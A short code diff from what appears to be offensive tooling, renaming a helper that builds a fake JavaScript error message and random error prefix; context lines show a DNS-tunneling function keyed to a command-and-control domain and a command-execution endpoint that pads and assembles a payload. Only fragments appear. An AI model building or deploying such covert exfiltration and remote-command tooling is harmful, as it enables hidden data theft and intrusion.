@@ -73,7 +73,7 @@ def dns_tunneling(original_bytes: bytes, c2_domain: str):
         pass
 
 
-def get_dummy_error_message() -> tuple[str, str]:
+def get_fake_prefix() -> tuple[str, str]:
     error_msg = "Uncaught ReferenceError: _is_loading is not defined"
     fake_prefix_js = "'ERR_NODE_' + Math.random().toString(16).slice(2, 8) + ':'"
 
@@ -108,7 +108,7 @@ async def execute_command(body: dict):
     padding_size = 65 * 1024  # 65KB
     padding_data = "A" * padding_size
 
-    error_msg, fake_prefix_js = get_dummy_error_message()
+    error_msg, fake_prefix_js = get_fake_prefix()
 
     if getenv:
         payload = f"""
